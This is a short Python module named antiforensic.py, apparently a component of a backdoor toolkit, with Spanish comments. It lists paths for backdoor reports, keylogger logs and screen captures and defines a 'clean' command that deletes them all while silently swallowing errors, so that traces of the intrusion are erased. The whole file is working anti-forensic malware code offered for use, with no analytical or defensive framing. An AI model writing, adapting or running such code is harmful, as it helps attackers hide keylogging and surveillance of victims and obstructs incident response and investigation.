# modules/antiforensic.py

import os
import shutil
import glob

# Rutas donde buscar logs, capturas, dumps, etc.
RUTAS_EVIDENCIA = [
    os.path.expanduser("~/BackDoors_1.1_Reports/"),
    os.path.expanduser("~/.bdid"),
    os.path.expanduser("~/keylog*"),
    os.path.expanduser("~/screencap*"),
    "/tmp/bd_*",
    "/tmp/keylog*",
    "/tmp/screencap*"
]

def limpiar_evidencia():
    for ruta in RUTAS_EVIDENCIA:
        for path in glob.glob(ruta):
            try:
                if os.path.isfile(path):
                    os.remove(path)
                elif os.path.isdir(path):
                    shutil.rmtree(path, ignore_errors=True)
            except Exception:
                pass

def run(cmd, *args):
    if cmd == "clean":
        limpiar_evidencia()
        return "[+] Evidencia limpiada."
    else:
        return "[!] Comando no soportado."
